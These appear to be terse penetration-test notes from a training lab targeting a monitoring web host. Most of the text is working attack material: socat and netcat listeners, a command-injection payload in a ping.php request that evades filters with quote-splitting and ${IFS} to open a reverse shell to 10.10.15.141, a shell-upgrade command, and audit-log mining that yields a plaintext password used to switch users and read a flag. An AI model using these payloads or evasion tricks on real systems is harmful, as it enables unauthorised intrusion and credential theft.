- monitoring.inlanefreight.local

- Start socat listener
```
socat file:`tty`,raw,echo=0 tcp-listen:4443
```
- Start nc listener
```
nc -lvnp 8443
```

```
GET /ping.php?ip=127.0.0.1%0a's'o'c'a't'${IFS}TCP4:10.10.15.141:8443${IFS}EXEC:bash HTTP/1.1
Host: monitoring.inlanefreight.local
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
Content-Type: application/json
Accept: */*
Referer: http://monitoring.inlanefreight.local/index.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: PHPSESSID=ntpou9fdf13i90mju7lcrp3f06
Connection: close
```

Run this command in nc listener:
```
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.15.141:4443
```

```
id
```
- webdev is a part of the adm group, so we can read audit logs!
```
aureport --tty | less
```
- sudo su srvadm
- ILFreightnixadm!
```
su srvadm
ILFreightnixadm!
cat flag.txt
```
